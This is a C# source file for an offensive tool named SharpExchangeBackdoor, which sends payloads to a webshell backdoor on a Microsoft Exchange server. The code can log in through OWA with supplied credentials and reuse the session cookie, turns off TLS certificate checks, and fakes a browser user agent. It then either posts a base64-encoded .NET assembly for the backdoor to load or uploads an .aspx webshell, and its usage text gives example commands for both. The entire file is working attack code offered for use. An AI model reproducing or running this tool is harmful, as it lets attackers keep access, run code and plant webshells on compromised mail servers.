using System;
using System.Text;
using System.Net;
using System.IO;
using System.Web;

namespace SharpExchangeBackdoor
{
    public class Program
    {
        public static string HttpPostData(string url, string path)
        {
            Console.WriteLine("[*] Try to read: " + path);
            byte[] buffer = System.IO.File.ReadAllBytes(path);
            string base64str = Convert.ToBase64String(buffer);

            Console.WriteLine("[*] Try to access: " + url);
            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string Param = "demodata=" + HttpUtility.UrlEncode(base64str);
            byte[] post=Encoding.UTF8.GetBytes(Param);
            Stream postStream = request.GetRequestStream();
            postStream.Write(post,0,post.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;    
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }
 
        public static string HttpPostDataAuth(string url, string username, string password, string path)
        {           
            string[] sArray = url.Split('/');
            string newurl = "https://" + sArray[2] + "/owa/auth.owa";
            Console.WriteLine("[*] Try to login");

            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(newurl) as HttpWebRequest;
            request.AllowAutoRedirect = false;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string Param = "destination=https%3A%2F%2F" + sArray[2] + "%2Fecp%2F&flags=4&forcedownlevel=0&username="+HttpUtility.UrlEncode(username)+"&password="+HttpUtility.UrlEncode(password)+"&passwordText=&isUtf8=1";            
            byte[] post=Encoding.UTF8.GetBytes(Param);
            
            Stream postStream = request.GetRequestStream();
            postStream.Write(post,0,post.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            if(response.StatusCode!=(HttpStatusCode)302)
            {
              Console.WriteLine("[!] Bad login response");
              System.Environment.Exit(0);
            }

            string cookie = "";
            if(response.Headers.GetValues("Set-Cookie")!=null)
            {
              foreach(string s in response.Headers.GetValues("Set-Cookie")) 
              {
                cookie+=s.Split(' ')[0]+" ";
              }
            }

            if(cookie.IndexOf("cadataKey") == -1)
            {
              Console.WriteLine("[-] Wrong password");
              System.Environment.Exit(0);
            }           
            Console.WriteLine("[+] Login success");

            Console.WriteLine("[*] Try to read: " + path); 
            byte[] buffer = System.IO.File.ReadAllBytes(path);
            string base64str = Convert.ToBase64String(buffer);

            Console.WriteLine("[*] Try to access: " + url);           
            request = WebRequest.Create(url) as HttpWebRequest;
            request.AllowAutoRedirect=false;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.Headers.Add("Cookie",cookie);
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string Param2 = "demodata=" + HttpUtility.UrlEncode(base64str);
            byte[] post2=Encoding.UTF8.GetBytes(Param2);
            Stream postStream2 = request.GetRequestStream();
            postStream2.Write(post2,0,post2.Length);
            postStream2.Close();

            response = request.GetResponse() as HttpWebResponse;   
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }

       public static string HttpUploadFile(string url, string path)
        {
            Console.WriteLine("[*] Try to read: " + path);
            Console.WriteLine("[*] Try to access: " + url);

            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.Method = "POST";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";
            string boundary = DateTime.Now.Ticks.ToString("X");
            request.ContentType = "multipart/form-data;charset=utf-8;boundary=" + boundary;
            byte[] itemBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
            byte[] endBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");
            int pos = path.LastIndexOf("\\");
            string fileName = path.Substring(pos + 1);
   
            StringBuilder sbHeader = new StringBuilder(string.Format("Content-Disposition:form-data;name=\"file\";filename=\"{0}\"\r\nContent-Type:application/octet-stream\r\n\r\n", fileName));
            byte[] postHeaderBytes = Encoding.UTF8.GetBytes(sbHeader.ToString());

            FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read);
            byte[] bArr = new byte[fs.Length];
            fs.Read(bArr, 0, bArr.Length);
            fs.Close();

            Stream postStream = request.GetRequestStream();
            postStream.Write(itemBoundaryBytes, 0, itemBoundaryBytes.Length);
            postStream.Write(postHeaderBytes, 0, postHeaderBytes.Length);
            postStream.Write(bArr, 0, bArr.Length);
            postStream.Write(endBoundaryBytes, 0, endBoundaryBytes.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;    
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }

       public static string HttpUploadFileAuth(string url, string username, string password, string path)
        {
            string[] sArray = url.Split('/');
            string newurl = "https://" + sArray[2] + "/owa/auth.owa";
            Console.WriteLine("[*] Try to login");

            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(newurl) as HttpWebRequest;
            request.AllowAutoRedirect = false;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string Param = "destination=https%3A%2F%2F" + sArray[2] + "%2Fecp%2F&flags=4&forcedownlevel=0&username="+HttpUtility.UrlEncode(username)+"&password="+HttpUtility.UrlEncode(password)+"&passwordText=&isUtf8=1";            
            byte[] post=Encoding.UTF8.GetBytes(Param);
            
            Stream postStream = request.GetRequestStream();
            postStream.Write(post,0,post.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            if(response.StatusCode!=(HttpStatusCode)302)
            {
              Console.WriteLine("[!] Bad login response");
              System.Environment.Exit(0);
            }

            string cookie = "";
            if(response.Headers.GetValues("Set-Cookie")!=null)
            {
              foreach(string s in response.Headers.GetValues("Set-Cookie")) 
              {
                cookie+=s.Split(' ')[0]+" ";
              }
            }

            if(cookie.IndexOf("cadataKey") == -1)
            {
              Console.WriteLine("[-] Wrong password");
              System.Environment.Exit(0);
            }           
            Console.WriteLine("[+] Login success");

            Console.WriteLine("[*] Try to read: " + path);
            Console.WriteLine("[*] Try to access: " + url);

            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            request = WebRequest.Create(url) as HttpWebRequest;
            request.Method = "POST";
            request.Headers.Add("Cookie",cookie);
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";
            string boundary = DateTime.Now.Ticks.ToString("X");
            request.ContentType = "multipart/form-data;charset=utf-8;boundary=" + boundary;
            byte[] itemBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
            byte[] endBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");
            int pos = path.LastIndexOf("\\");
            string fileName = path.Substring(pos + 1);
   
            StringBuilder sbHeader = new StringBuilder(string.Format("Content-Disposition:form-data;name=\"file\";filename=\"{0}\"\r\nContent-Type:application/octet-stream\r\n\r\n", fileName));
            byte[] postHeaderBytes = Encoding.UTF8.GetBytes(sbHeader.ToString());

            FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read);
            byte[] bArr = new byte[fs.Length];
            fs.Read(bArr, 0, bArr.Length);
            fs.Close();

            Stream postStream2 = request.GetRequestStream();
            postStream2.Write(itemBoundaryBytes, 0, itemBoundaryBytes.Length);
            postStream2.Write(postHeaderBytes, 0, postHeaderBytes.Length);
            postStream2.Write(bArr, 0, bArr.Length);
            postStream2.Write(endBoundaryBytes, 0, endBoundaryBytes.Length);
            postStream2.Close();

            response = request.GetResponse() as HttpWebResponse;    
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }


        public static void ShowUsage()
        {
            string Usage = @"
Use to send payload to the Exchange webshell backdoor.
Support:
    assemblyLoad
    webshellWrite

Usage:
    <url> <user> <password> <mode> <path>
mode:
    assemblyLoad
    webshellWrite
eg.
    SharpExchangeBackdoor.exe https://192.168.1.1/owa/auth/errorFE.aspx no auth assemblyLoad payload.dll
    SharpExchangeBackdoor.exe https://192.168.1.1/ecp/About.aspx user1 123456 webshellWrite payload.aspx
";
            Console.WriteLine(Usage);
        }

        public static void Main(string[] args)
        {

            if(args.Length!=5)
            {
                ShowUsage();
                System.Environment.Exit(0);
            }            
            try
            {                
                if(args[3] == "assemblyLoad")
                {
                    Console.WriteLine("[*] Mode: assemblyLoad");
                    if((args[1] == "no") && (args[2] == "auth"))
                    {
                        Console.WriteLine("[*] Auth: Null");    
                        string result = HttpPostData(args[0], args[4]);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                    else
                    {
                        Console.WriteLine("[*] Auth: "+ args[1] + " " + args[2]);    
                        string result = HttpPostDataAuth(args[0], args[1], args[2], args[4]);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                }

                else if(args[3] == "webshellWrite")
                {
                    Console.WriteLine("[*] Mode: webshellWrite");
                    if((args[1] == "no") && (args[2] == "auth"))
                    {
                        Console.WriteLine("[*] Auth: Null");    
                        string result = HttpUploadFile(args[0], args[4]);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                    else
                    {
                        Console.WriteLine("[*] Auth: "+ args[1] + " " + args[2]);    
                        string result = HttpUploadFileAuth(args[0], args[1], args[2], args[4]);
                        Console.WriteLine("[*] Response: \n" + result);
                    }
                }
                else
                {
                    Console.WriteLine("[!] Wrong parameter");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
        	}
        }
    }
}